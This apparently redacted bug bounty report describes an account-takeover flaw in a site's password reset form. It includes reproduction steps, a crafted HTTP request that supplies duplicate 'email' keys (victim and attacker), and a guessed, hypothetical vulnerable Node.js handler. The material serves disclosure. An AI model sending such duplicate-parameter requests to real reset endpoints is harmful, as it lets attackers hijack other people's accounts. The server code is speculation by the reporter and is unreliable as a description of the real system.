## Summary:
I found a way to change the password of a ███████ Forgot Passkey account via the password reset form and successfully retrieve the final reset link without user interactions, using just its email address. A critical vulnerability has been discovered in the password reset mechanism of ███████ `https://www.███████.co/forgot`, allowing an attacker to take over an account without requiring interaction from the legitimate user. The flaw resides in the authentication process where multiple email parameters can be submitted, leading to unauthorized access.


## Proof of Concept (PoC) - Steps to Reproduce
[add details for how we can reproduce the issue]

 - Go to the Password Reset Page Navigate to https://www.███████.co/forgot.
 - Intercept the Request Use an HTTP interceptor tool such as Burp Suite or Postman to capture the request sent to the password reset API.
 - Modify the HTTP Request Send a crafted request with two email fields, targeting the victim's email while using the attacker's email as a secondary parameter.

The captured request here’s the Vulnerable HTTP request intercepted using Burp Suite:
```
POST /api/auth/signin/email HTTP/2
Host: www.███████.co
Content-Type: application/json;charset=UTF-8

{
   "email":"victim@gmail.com",
   "email":"attacker@example.com",
   "callbackUrl":"/redirect",
   "redirect":"false",
   "csrfToken":"d960ca3082ee393e55bb5a27bf60771528c99bd13a3332b5a97fba2f03248af4",
   "json":"true"
}
```
- The CSRF `token` remains unchanged for multiple requests.

This report highlights a critical Account Takeover vulnerability present in ███████’s password reset mechanism. The ability to exploit multiple email parameters in a password reset request poses severe security threats. Immediate fixes and additional security layers are recommended to mitigate the risks and protect user data. Below is a possible vulnerable implementation of the password reset logic on the server:
```js
app.post('/api/auth/signin/email', async (req, res) => {
    try {
        const { email } = req.body;
        if (!email) {
            return res.status(400).json({ message: "Email is required" });
        }
        
        // Fetch user details
        const user = await db.users.findOne({ email: email });
        if (!user) {
            return res.status(404).json({ message: "User not found" });
        }
        
        // Generate reset token
        const resetToken = generateResetToken(user.id);
        
        // Send email (Issue: Email parameter is not properly validated, attacker can inject an extra email field)
        sendResetEmail(email, resetToken);
        
        return res.status(200).json({ message: "Reset email sent" });
    } catch (error) {
        return res.status(500).json({ message: "Internal Server Error" });
    }
});
```
{F4119495}

## Supporting Exploit Explanation/References:
- The function extracts `email` from `req.body`, but does not check for multiple occurrences.
- The last occurrence of `email` is processed, allowing attackers to replace the intended recipient.
- No verification (e.g., requiring the user to confirm via a separate session) is enforced before sending the reset link.


  * reference's #2293343
  * https://owasp.org/www-project-top-ten/
  * https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html

## Impact

By just knowing the victim email address used on ███████ , you can takeover his account by changing his password without user interaction since the attacker get the same email as the victim.
